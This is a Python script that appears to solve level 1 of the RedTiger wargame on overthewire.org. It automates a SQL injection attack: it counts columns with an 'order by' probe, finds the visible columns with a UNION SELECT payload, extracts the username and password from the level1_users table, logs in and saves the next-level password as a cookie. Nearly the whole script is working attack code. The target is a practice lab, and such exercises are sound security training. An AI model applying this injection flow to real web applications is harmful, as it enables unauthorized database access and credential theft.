#!/usr/bin/env python3
import pickle
import tigers as tg


def main():
    '''
    Target: Get the login for the user Hornoxe 
    Tablename: level1_users 
    '''
    base_name = 'level1_users'
    url = "https://redtiger.labs.overthewire.org/level1.php"
    finds = ['username', 'password']  # What we are finding
    pass_r = 'The password for the next level is: '

    # Counting the number of columns
    columns = tg.count_columns(url, '1 order by %s', 'cat')

    list_of_columns = [str(c + 1) for c in range(columns)]

    # Search for visible columns
    payload = dict(
        cat=f"-1 union select {','.join(list_of_columns)} from {base_name}")
    # Data for compare
    p_base = dict(cat='-1')
    list_of_visible, html_visible = tg.find_visible_columns(url, len(list_of_columns),
                                                            payload, p_base)

    # Search for the desired data
    if len(finds) <= len(list_of_visible):
        for i, f in enumerate(finds):
            # Replace the displayed fields in list_of_columns with the desired parameters
            list_of_columns[int(list_of_visible[i]) - 1] = f
    else:
        print('too small visible list')
        exit(1)

    payload = dict(
        cat=f"-1 union select {','.join(list_of_columns)} from {base_name}")
    keys = tg.find_param(url, len(finds), html_visible, payload)

    # Authorization
    data = dict(user=keys[0], password=keys[1], login='Login')
    response = tg.get_request(url, data, method='post')

    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)

    # Save cookie
    try:
        with open('cooks.pickle', 'rb') as f:
            cooks = pickle.load(f)
        if ('level2login' not in cooks) or (cooks['level2login'] != passw):
            cooks['level2login'] = passw
            tg.save_cookies(cooks)
    except:
        cooks = dict(level2login=passw)
        tg.save_cookies(cooks)


if __name__ == '__main__':
    main()
